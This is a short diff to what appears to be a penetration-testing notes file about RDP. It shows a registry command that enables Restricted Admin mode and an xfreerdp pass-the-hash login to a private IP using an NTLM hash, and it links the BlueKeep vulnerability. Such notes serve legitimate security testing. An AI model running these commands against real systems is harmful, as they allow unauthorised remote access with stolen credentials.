@@ -40,8 +40,8 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 ```
 
 ```shell
-xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
-```
+xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9 /scale-desktop:200 /scale:180
+``` 
 
 ## Latest Vulns
 [Blue Keep CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)
